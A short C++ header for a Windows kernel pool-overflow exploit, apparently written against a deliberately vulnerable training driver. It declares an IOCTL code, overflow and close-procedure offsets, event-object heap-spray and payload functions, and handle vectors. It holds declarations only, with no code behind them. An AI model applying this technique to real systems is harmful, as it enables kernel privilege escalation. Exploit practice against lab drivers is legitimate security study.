#pragma once
#include <Windows.h>

#define IOCTL_NON_PAGED_POOL_OVERFLOW 2236431
#define PAYLOAD_SIZE 0x25
#define OVERFLOW_OFFSET 0x1F8
#define CLOSE_PROCEDURE_OFFSET 0x60

NTSTATUS HeapSprayEventObject();
PBYTE GetNonPagedPoolOverflowPayload();
VOID CleanEventHandles();

std::vector<HANDLE> first;
std::vector<HANDLE> second;